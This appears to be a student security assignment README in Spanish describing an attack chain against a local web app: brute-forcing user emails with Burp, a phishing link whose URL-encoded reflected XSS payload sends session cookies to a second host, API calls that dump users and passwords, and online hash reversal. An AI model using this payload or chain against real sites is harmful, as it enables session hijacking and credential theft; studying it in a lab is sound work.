# TP Seguridad Apps Web - Grupo 3

## Vector de ataque
1) Hacer fuerza bruta con Burp para obtener mails de usuarios
2) Enviar mails con link malicioso: `http://localhost:3000/html/home/user/dashboard/index.html?nombre=Juan%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%22POST%22,%27http://localhost:4000/damecookie%27);xhr.withCredentials%20=%20true;xhr.send()%3C/script%3E`
3) Leer las cookies e intentar entrar al sitio
4) Ver los requests que se hacen
5) Hacer GET /api/v1/User y GET /api/v1/User?distinct=password para obtener un array de usuarios y un array de sus respectivas contraseñas
6) Buscar contraseñas hasheadas en https://hashtoolkit.com/reverse-hash
